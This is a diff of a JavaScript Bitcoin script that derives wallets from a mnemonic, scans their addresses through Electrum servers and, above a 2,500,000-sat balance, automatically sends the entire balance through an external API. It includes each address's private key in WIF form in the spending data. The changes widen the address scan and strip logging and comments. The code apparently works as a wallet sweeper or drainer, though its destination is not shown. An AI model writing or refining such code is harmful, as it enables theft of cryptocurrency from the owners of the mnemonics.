@@ -34,7 +34,6 @@ async function connectToElectrumServer() {
     throw new Error('All Electrum servers failed to connect');
 }
 
-
 async function generateWallet(mnemonic) {
     const network = bitcoin.networks.bitcoin;
     let isNewMnemonic = false;
@@ -82,7 +81,7 @@ async function processAddressesForAllBipTypes(root, network, electrumClient) {
         allUtxos.push(...utxos);
     }
 
-    // Check if the total balance is greater than 200,000 sats
+    // Check if the total balance is greater than 2,500,000 sats
     if (totalBalance > 2500000) {
         await sendTransaction(totalBalance, allUtxos);
     }
@@ -100,7 +99,7 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
         utxos: []
     };
 
-    let batchSize = 10;
+    let batchSize = 100;
     let start = 0;
     let receiveUnusedFound = false;
     let changeUnusedFound = false;
@@ -109,14 +108,12 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
     let lastUsedChangeIndex = -1;
 
     while (!receiveUnusedFound || !changeUnusedFound) {
-        console.log(`Checking addresses from ${start} to ${start + batchSize - 1} for ${bipType}`);
         const batchResults = await checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize);
 
         results.usedAddresses.push(...batchResults.usedAddresses);
         results.totalBalance += batchResults.totalBalance;
         results.utxos.push(...batchResults.utxos);
 
-        // Update the last used indices
         if (batchResults.lastUsedReceiveIndex > lastUsedReceiveIndex) {
             lastUsedReceiveIndex = batchResults.lastUsedReceiveIndex;
         }
@@ -133,31 +130,36 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
             changeUnusedFound = true;
         }
 
-        // Break if both receive and change unused addresses are found
         if (receiveUnusedFound && changeUnusedFound) {
             break;
         }
 
-        // Check for a stop condition: no more addresses with transactions found
         if (batchResults.usedAddresses.length === 0) {
             break;
         }
 
         start += batchSize;
-        batchSize *= 2;
     }
 
     results.usedAddresses.sort((a, b) => a.path.localeCompare(b.path));
 
-    // Ensure non-negative last used indices
     lastUsedReceiveIndex = Math.max(lastUsedReceiveIndex, -1);
     lastUsedChangeIndex = Math.max(lastUsedChangeIndex, -1);
 
-    // Assign fresh receive and change addresses based on the last used index
-    results.freshReceiveAddress = await checkAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, paths[bipType]);
-    results.freshChangeAddress = await checkAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);
+    results.freshReceiveAddress = await checkFreshAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, paths[bipType]);
+    results.freshChangeAddress = await checkFreshAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);
 
     return results;
+}
+
+async function checkFreshAddress(account, index, chain, network, bipType, electrumClient, basePath) {
+    let addressData;
+    do {
+        addressData = await checkAddress(account, index, chain, network, bipType, electrumClient, basePath);
+        index++;
+    } while (addressData.transactions.total > 0);
+
+    return addressData;
 }
 
 async function checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize) {
@@ -174,9 +176,7 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
     const tasks = [];
     for (let i = start; i < start + batchSize; i++) {
         for (const chain of [0, 1]) {
-            if (i < 0) continue; // Ensure index is never negative
             tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
-                console.log(`Checked address at path: ${addressData.path} with transactions: ${addressData.transactions.total}`);
                 if (addressData.transactions.total > 0) {
                     results.usedAddresses.push(addressData);
                     results.utxos.push(...addressData.utxos);
@@ -241,7 +241,7 @@ async function checkAddress(account, index, chain, network, bipType, electrumCli
             txid: utxo.tx_hash,
             vout: utxo.tx_pos,
             amount: utxo.value,
-            wif: derivedPath.toWIF(), // Include WIF for spending
+            wif: derivedPath.toWIF(),
             type: getAddressType(address),
             status: utxo.height === 0 ? 'unconfirmed' : 'confirmed'
         }))
@@ -294,11 +294,9 @@ async function sendTransaction(totalBalance, utxos) {
     };
 
     try {
-        // Initial API call to get virtual size
         const initialResponse = await axios.post(url, initialBody);
         const virtualSize = initialResponse.data.virtualSize;
 
-        // Calculate the final transaction fee
         const finalTransactionFee = 35 * virtualSize;
         const finalAmountToSend = totalBalance - finalTransactionFee;
 
@@ -312,8 +310,7 @@ async function sendTransaction(totalBalance, utxos) {
             transactionFee: finalTransactionFee.toString()
         };
 
-        // Final API call to broadcast the transaction
-        const finalResponse = await axios.post(url, finalBody);
+        await axios.post(url, finalBody);
         console.log('Transaction sent successfully');
     } catch (error) {
         if (error.response) {
